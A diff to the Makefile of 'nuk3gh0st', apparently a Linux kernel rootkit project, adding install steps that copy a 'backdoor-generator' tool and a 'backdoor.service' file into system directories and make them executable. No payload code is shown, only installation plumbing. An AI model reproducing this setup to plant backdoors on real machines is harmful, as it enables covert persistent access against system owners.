@@ -17,17 +17,21 @@ install:
 	-cp rmstartup-nuk3gh0st /usr/bin/rmstartup-nuk3gh0st
 	-cp nuk3gh0st.startup /usr/share/nuk3gh0st/nuk3gh0st.startup
 	-cp nuk3gh0st.service /usr/share/nuk3gh0st/nuk3gh0st.service
+	-cp backdoor-generator /usr/bin/backdoor-generator
+	-cp backdoor.service /usr/share/nuk3gh0st/backdoor.service
 	chmod +x /usr/bin/load-nuk3gh0st
 	chmod +x /usr/bin/unload-nuk3gh0st
 	chmod +x /usr/bin/startup-nuk3gh0st
 	chmod +x /usr/bin/rmstartup-nuk3gh0st
 	chmod +x /usr/share/nuk3gh0st/nuk3gh0st.startup
+	chmod +x /usr/bin/backdoor-generator
+	chmod +x /usr/share/nuk3gh0st/backdoor.service
 uninstall:
 	-rm /usr/bin/nuk3gh0st
 	-rm /usr/bin/load-nuk3gh0st
 	-rm /usr/bin/unload-nuk3gh0st
 	-rm /usr/bin/startup-nuk3gh0st
 	-rm /usr/bin/rmstartup-nuk3gh0st
-	-rm -rf /usr/share/nuk3gh0st/
+	-rm -rf /usr/share/nuk3gh0st
 clean:
 	-rm -rf *.o *.ko *.symvers *.mod.* *.order nuk3gh0st
